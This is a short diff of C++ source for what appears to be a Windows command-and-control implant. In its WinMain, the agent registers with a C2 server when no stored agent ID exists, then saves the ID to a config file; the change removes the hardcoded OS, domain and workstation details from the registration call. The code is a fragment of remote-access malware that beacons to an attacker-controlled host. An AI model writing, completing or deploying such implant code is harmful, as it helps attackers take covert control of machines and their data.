@@ -15,8 +15,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
         std::wifstream cfg_file(config_path);
         std::getline(cfg_file, agent_id);
     }
-    else {
-        nlohmann::json registration = communication::RegisterAgent(C2, L"Windows 10", L"CORPDOMAIN", L"WORKSTATION-01");
+    else {  
+        nlohmann::json registration = communication::RegisterAgent(C2);
         agent_id = registration["agent_id"].get<std::wstring>();
         std::wofstream cfg_file(config_path);
         cfg_file << agent_id;
